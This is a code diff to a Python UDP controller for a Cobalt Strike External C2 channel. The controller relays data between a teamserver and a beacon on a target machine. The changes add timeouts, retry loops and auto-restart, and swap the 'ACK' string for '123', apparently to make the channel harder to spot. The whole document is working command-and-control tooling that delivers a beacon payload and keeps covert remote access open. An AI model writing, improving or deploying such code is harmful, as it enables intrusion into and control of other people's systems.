@@ -18,7 +18,7 @@ class SocketInfo:
     """
     @brief Class to hold info for TCP session
     """
-    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str):
+    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str, timeout, retries):
         """
 
         :param ts_ip: IP address of CS Teamserver
@@ -26,6 +26,8 @@ class SocketInfo:
         :param srv_ip: IP to bind to on server
         :param srv_port: Port of server to listen on
         :param pipe_str: String for named pipe on client
+        :param timeout: The socket timeout option (in seconds)
+        :param retries: The number of times to retry a recv
         """
         if len(pipe_str) > 50:
             raise ValueError('pipe_str must be less than 50 characters')
@@ -34,7 +36,9 @@ class SocketInfo:
         self.srv_ip = srv_ip
         self.srv_port = srv_port
         self.pipe_str = pipe_str
-        
+        self.timeout = timeout
+        self.retries = retries
+
 
 class ExternalC2Controller:
     def __init__(self, port):
@@ -42,7 +46,7 @@ class ExternalC2Controller:
         self.packet_size = 1024         #Max payload size, must be same as in client.c. Note that actual payload sent will be packet_size+4.
         self.server_seqnum = 0
         self.client_seqnum = 0
-        self.timeout = 5
+        self.retries = 0
 
     def encode_frame(self, data):
         """
@@ -130,43 +134,56 @@ class ExternalC2Controller:
         
         :param data: Data to send to beacon
         """
-        pendingAck = True
-        socketList = []                         #Select function takes in an iterable of sockets,
-        socketList.append(self._socketServer)   #so we wrap our socket in a list.
+        _retries = self.retries
         length = len(data)
-#        print("Length to send: {}".format(length))
         lenFrame = struct.pack("<2I", self.server_seqnum, length)
-        while(pendingAck):
-            self._socketServer.sendto(lenFrame, self.clientAddr)
-            selectLists = select.select(socketList, [], [], self.timeout)
-            if (len(selectLists[0]) > 0 ):
+        while (_retries > 0):
+            try:
+                self._socketServer.sendto(lenFrame, self.clientAddr)
                 ackFrame, addr = self._socketServer.recvfrom(3)
-                ackMessage = ackFrame.decode(errors="replace")
-                if (ackMessage == "ACK"):
-#                    print("Length sent!")
-                    pendingAck = False
-                    self.server_seqnum += 1
-            self.timeout = 5 # We need to reset the timeout every time we call select()
+                if (addr != self.clientAddr):
+                    print("ERROR: RECEIVING FROM INCORRECT ADDRESS!")
+                else:
+                    ackMessage = ackFrame.decode(errors="replace")
+                    if (ackMessage == "123"):
+                        self.server_seqnum += 1
+                        break
+            except socket.timeout:
+                _retries -= 1
+                print("Socket timed out, retires left:{}".format(_retries))
+            except Exception as e:
+                print("Recv ack in sendToBeacon failed. Error: {}".format(e))
+                return None
+        if (_retries <= 0):
+            print("No more retries, exiting")
+            return None
+
         total = 0
-        while (total < length):
-            pendingAck = True
-            packetSentLength = 0
-            while (pendingAck):
+        # Reset retries
+        _retries = self.retries
+        while (_retries > 0 and total < length):
+            try:
+                packetSentLength = 0
                 sentPayload = (struct.pack("<I", self.server_seqnum) + data[total: (total+self.packet_size)])
                 packetSentLength = self._socketServer.sendto(sentPayload, self.clientAddr)
-#                print("This packet sent: {}".format(packetSentLength))
-                selectLists = select.select(socketList, [], [], self.timeout)
-                if (len(selectLists[0]) > 0):
-                    ackFrame, addr = self._socketServer.recvfrom(3)
+                ackFrame, addr = self._socketServer.recvfrom(3)
+                if (addr != self.clientAddr):
+                    print("ERROR: RECEIVING FROM INCORRECT ADDRESS!")
+                else:
                     ackMessage = ackFrame.decode(errors="replace")
-                    if (ackMessage == "ACK"):
+                    if (ackMessage == "123"):
                         total += packetSentLength - 4
-                        pendingAck = False
                         self.server_seqnum += 1
-                        # print("Bytes sent: {}".format(total))
-                        # print("Bytes remaining: {}".format(length-total))
-                        # print()
-                self.timeout = 5 
+                        continue
+            except socket.timeout:
+                _retries -= 1
+                print("Socket timed out, retires left:{}".format(_retries))
+            except Exception as e:
+                print("Recv ack in sendToBeacon failed. Error: {}".format(e))
+                return None
+        if (_retries <= 0):
+            print("No more retries, exiting")
+            return None
                         
 
 
@@ -178,9 +195,10 @@ class ExternalC2Controller:
         :return: data received from beacon
         """
         dataLength = -1
+        _retries = self.retries
         recv_dataLength = None
-        try:
-            while(dataLength < 0):  #This loop implementation may come back to bite me...
+        while (_retries > 0):
+            try:
                 recv_dataLength, addr = self._socketServer.recvfrom(8)
                 if (addr != self.clientAddr):
                     print("ERROR: RECEIVING FROM INCORRECT ADDRESS!")
@@ -191,17 +209,24 @@ class ExternalC2Controller:
                         # print("Client seqnum received: {}".format(seqnum))
                         if (self.ackIfCorrect(seqnum)):
                             dataLength = (struct.unpack("<I", recv_dataLength[4:8]))[0]
-                            # print("Struct unpacked, length:")
-                            # print(dataLength)
+                            # print("Struct unpacked, length: {}".format(dataLength))
                             self.client_seqnum += 1
-        except Exception as e:
-            print("Recv length failed.")
-            print(e)
+                            break
+            except socket.timeout:
+                _retries -= 1
+                print("Socket timed out, retires left:{}".format(_retries))
+            except Exception as e:
+                print("Recv length in recvFromBeacon failed. Error: {}".format(e))
+                return None
+        if (_retries <= 0):
+            print("No more retries, exiting")
             return None
         total = 0
+        # Reset retries
+        _retries = self.retries
         data = bytearray(dataLength)
-        try:
-            while (total < dataLength):
+        while (_retries > 0 and total < dataLength):
+            try:
                 dataChunk, addr = self._socketServer.recvfrom(self.packet_size+4)
                 if (addr != self.clientAddr):
                         print("ERROR: RECEIVING FROM INCORRECT ADDRESS!")
@@ -220,16 +245,22 @@ class ExternalC2Controller:
                             data[total : (total+len(dataChunk)-4)] = dataChunk[4:]
                             total = (total + len(dataChunk)-4)
                         self.client_seqnum += 1
-        except:
-            print("Recv data failed.")
+            except socket.timeout:
+                _retries -= 1
+                print("Socket timed out, retires left:{}".format(_retries))
+            except Exception as e:
+                print("Recv data in recvFromBeacon failed. Error: {}".format(e))
+                return None
+        if (_retries <= 0):
+            print("No more retries, exiting")
             return None
-        
         return data
 
     def ackIfCorrect(self, seqnum):
         # print("Inside ackIfCorrect")
         output = False
-        msg = "ACK".encode()
+        # Changed ACK to 123
+        msg = "123".encode()
         if (seqnum == self.client_seqnum):
             # print("Seqnum correct")
             self._socketServer.sendto(msg, self.clientAddr)
@@ -267,48 +298,63 @@ class ExternalC2Controller:
         # Now that we have our beacon to send, wait for a connection from our target
         self._socketServer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self._socketServer.bind((socketInfo.srv_ip,socketInfo.srv_port))
+        self.retries = socketInfo.retries
+        print("Number of retries: {}".format(self.retries))
         connected = False
         while(not connected):
             #We get one: 
-            data, clientAddr = self._socketServer.recvfrom(4)
+            try:
+                data, clientAddr = self._socketServer.recvfrom(4)
+            except socket.timeout:
+                print("Socket timed out, looping..")
+                continue
+            except Exception as e:
+                print("Recv data in recvFromBeacon failed. Error: {}".format(e))
+                return
             print("Connection from {}".format(clientAddr))
-            # print(data)
             self.client_seqnum = (struct.unpack("<I", data))[0]
             self.clientAddr = clientAddr
             self.client_seqnum += 1
 
-            socketList = []                         #Select function takes in an iterable of sockets,
-            socketList.append(self._socketServer)   #so we wrap our socket in a list.
+            self._socketServer.settimeout(socketInfo.timeout)
 
             #Send my seqneunce number
             #If an ACK arrives, we are connected!
-            pendingAck = True
-            counter = 0
-            while (pendingAck and counter < 2):
-                self._socketServer.sendto(struct.pack("<I", self.server_seqnum), self.clientAddr)
-                selectLists = select.select(socketList, [], [], self.timeout)
-                if (len(selectLists[0]) > 0):
+            #changed ACK to 123
+            _retries = self.retries
+            while (_retries > 0):
+                try:
+                    self._socketServer.sendto(struct.pack("<I", self.server_seqnum), self.clientAddr)
                     data, addr = self._socketServer.recvfrom(4)
-                    self.server_seqnum += 1
-                    if (data.decode() != "ACK\x00"):
-                        print("Error in 3-way handshake?")
-                        print(data.decode(errors="replace"))
-                        exit()
+                    if (addr != self.clientAddr):
+                        print("ERROR: RECEIVING FROM INCORRECT ADDRESS!")
                     else:
-                        connected = True
-                        pendingAck = False
-                else:
-                    counter += 1
+                        self.server_seqnum += 1
+                        if (data.decode() != "123\x00"):
+                            print("Error in 3-way handshake?")
+                            print(data.decode(errors="replace"))
+                            exit()
+                        else:
+                            connected = True
+                            break
+                except socket.timeout:
+                    _retries -= 1
+                    print("Socket timed out, retires left:{}".format(_retries))
+                except Exception as e:
+                    print("Recv ack in 3 way handshake failed. Error: {}".format(e))
+                    return
+
             if (not connected):
                 print("Failed 3-way handshake from {}".format(clientAddr))
-                
+
+        print("Handshake completed. Sending payload size {} to client.".format(len(payload)))  
 
         # Send beacon payload to target
         self.sendToBeacon(payload)
 
         #Wait for payload
-        time.sleep(5)
-
+        time.sleep(1)
+        print("Start pipe dance")
         while True:
             data = self.recvFromBeacon()
             if data == None:
@@ -334,13 +380,19 @@ parser.add_argument('ts_ip', help="IP of teamserver (or redirector).")
 parser.add_argument('srv_ip', help="IP to bind to on server.")
 parser.add_argument('srv_port', type=int, help="Port number to bind to on server.")
 parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client.")
+parser.add_argument('timeout', type=int, help="The socket timeout option (in seconds) set by settimeout()")
+parser.add_argument('retries', type=int, help="Number of times to retry listening for a connection after a timeout occurs.")
 parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
+parser.add_argument('--restart', '-r', default="N", help="Sleep 10s then restart the server after a disconnect or exit (Y/N). Default is N.")
 #TODO: Troubleshoot why x64 didnt work..
 #parser.add_argument('--arch', '-a', choices=['x86', 'x64'], default='x86', type=str, help="Architecture to use for beacon. x86 or x64. Default is x86.")
 args = parser.parse_args()
 controller = ExternalC2Controller(args.teamserver_port)
-socketInfo = SocketInfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str)
+socketInfo = SocketInfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str, args.timeout, args.retries)
 while True:
     controller.run(socketInfo, 'x86')
+    if (args.restart == "N"):
+        print("Exiting")
+        break
     print('waiting 10s before reconnecting to TS')
     time.sleep(10)
